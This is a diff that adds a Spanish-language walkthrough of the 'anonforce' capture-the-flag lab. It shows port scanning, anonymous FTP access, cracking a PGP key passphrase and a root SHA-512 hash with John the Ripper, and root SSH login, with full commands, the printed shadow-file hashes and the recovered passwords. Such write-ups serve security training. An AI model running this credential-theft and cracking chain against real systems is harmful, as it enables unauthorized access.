@@ -1,2 +1,244 @@
 #anonforce walkthrough
 #Los cambios de ip en la máquina se deben a que a la he completado en varios días, o al reinicio de la misma.
+
+Comienzo con un escaneo de puertos.
+
+sudo nmap -p- 10.130.184.139
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-24 13:38 CEST
+Nmap scan report for 10.130.184.139
+Host is up (0.031s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+
+Nmap done: 1 IP address (1 host up) scanned in 13.15 seconds
+
+Tan solo dos puertos.
+Al tener abierto ftp, no voy a realizar un escaneo -sVC y me conecto al puerto 21.
+
+Pruebo login anónimo(esto podría haberlo comprobado con un escaneo, la verdad)
+
+ftp 10.130.184.139
+Connected to 10.130.184.139.
+220 (vsFTPd 3.0.3)
+Name (10.130.184.139:mksk): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+
+Y consigo acceso por ftp.
+
+Tengo acceso a todas las carpetas del sistema, y la primera flag esta en el /home del usuario.
+
+ftp> ls
+229 Entering Extended Passive Mode (|||28474|)
+150 Here comes the directory listing.
+drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
+226 Directory send OK.
+ftp> cd melodias
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||19911|)
+150 Here comes the directory listing.
+-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
+226 Directory send OK.
+ftp> get user.txt
+local: user.txt remote: user.txt
+229 Entering Extended Passive Mode (|||62245|)
+150 Opening BINARY mode data connection for user.txt (33 bytes).
+100% |***************************************************************************|    33      407.93 KiB/s    00:00 ETA
+226 Transfer complete.
+33 bytes received in 00:00 (1.03 KiB/s)
+
+cat user.txt 
+606************************af8
+
+Ahora queda la de root.
+
+Vuelvo a ver si hay alguna otra carpeta que me llame la atención, ya que a root no puedo acceder.
+
+ftp> ls 
+229 Entering Extended Passive Mode (|||15941|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
+drwxr-xr-x   17 0        0            3700 Jul 24 04:36 dev
+drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
+lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
+lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
+drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
+drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
+drwx------    2 0        0           16384 Aug 11  2019 lost+found
+drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
+drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
+drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
+drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
+dr-xr-xr-x   85 0        0               0 Jul 24 04:36 proc
+drwx------    3 0        0            4096 Aug 11  2019 root
+drwxr-xr-x   18 0        0             540 Jul 24 04:36 run
+drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
+dr-xr-xr-x   13 0        0               0 Jul 24 04:36 sys
+drwxrwxrwt    9 0        0            4096 Jul 24 04:36 tmp
+drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
+drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
+lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
+lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
+
+notread me llama la atención.
+
+ftp> cd notread
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||53630|)
+150 Here comes the directory listing.
+-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
+-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
+
+Me encuentro un archivo pgp y su clave.
+
+Me descargo ambos.
+
+ftp> get backup.pgp
+local: backup.pgp remote: backup.pgp
+229 Entering Extended Passive Mode (|||31468|)
+150 Opening BINARY mode data connection for backup.pgp (524 bytes).
+100% |***************************************************************************|   524        4.80 MiB/s    00:00 ETA
+226 Transfer complete.
+524 bytes received in 00:00 (14.20 KiB/s)
+ftp> get private.asc
+local: private.asc remote: private.asc
+229 Entering Extended Passive Mode (|||11450|)
+150 Opening BINARY mode data connection for private.asc (3762 bytes).
+100% |***************************************************************************|  3762       36.60 MiB/s    00:00 ETA
+226 Transfer complete.
+3762 bytes received in 00:00 (114.87 KiB/s)
+
+Paso la clave a hash.txt con john.
+
+john-the-ripper.gpg2john private.asc > hash.txt
+
+File private.asc
+
+Y lo crackeo.
+
+john-the-ripper --wordlist=/home/mksk/wordlists/rockyou.txt hash.txt 
+Warning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"
+Use the "--format=gpg-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65536 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+xbox360          (anonforce)     
+1g 0:00:00:00 DONE (2026-07-24 13:50) 100.0g/s 94400p/s 94400c/s 94400C/s xbox360..diamonds
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+Importo la clave y descifro el archivo.
+
+ gpg --import private.asc
+gpg: clave B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" sin cambios
+gpg: clave B92CD1F280AD82C2: clave secreta importada
+gpg: clave B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" sin cambios
+gpg: Cantidad total procesada: 2
+gpg:              sin cambios: 2
+gpg:       claves secretas leídas: 1
+gpg:   claves secretas importadas: 1
+
+gpg --output backup.decrypted --decrypt backup.pgp
+gpg: encrypted with elg512 key, ID AA6268D1E6612967, created 2019-08-12
+      "anonforce <melodias@anonforce.nsa>"
+gpg: NOTA: el cifrado CAST5 no aparece en las preferencias del receptor
+
+
+El archivo resultante es el archivo /etc/passwd de la máquina víctima. 
+
+cat backup.decrypted 
+root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18120:0:99999:7:::
+uuidd:*:18120:0:99999:7:::
+melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
+sshd:*:18120:0:99999:7:::
+ftp:*:18120:0:99999:7::
+
+Paso el hash de root a hash.txt y lo crackeo.
+
+cat hash.txt 
+$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0
+
+john-the-ripper --wordlist=/home/mksk/wordlists/rockyou.txt hash.txt 
+Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
+Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 16 OpenMP threads
+Note: Passwords longer than 26 [worst case UTF-8] to 79 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+hikari           (?)     
+1g 0:00:00:00 DONE (2026-07-24 13:54) 3.846g/s 31507p/s 31507c/s 31507C/s newzealand..total90
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+Ahora tengo un set de credenciales para root. 
+Pruebo el login por ssh.
+
+ssh root@10.130.184.139
+The authenticity of host '10.130.184.139 (10.130.184.139)' can't be established.
+ED25519 key fingerprint is SHA256:+bhLW3R5qYI2SvPQsCWR9ewCoewWWvFfTVFQUAGr+ew.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.130.184.139' (ED25519) to the list of known hosts.
+root@10.130.184.139's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+root@ubuntu:~# ls
+root.txt
+
+Y encuentro la segunda flag.
+
+root@ubuntu:~# cat root.txt 
+f70******************dce
+
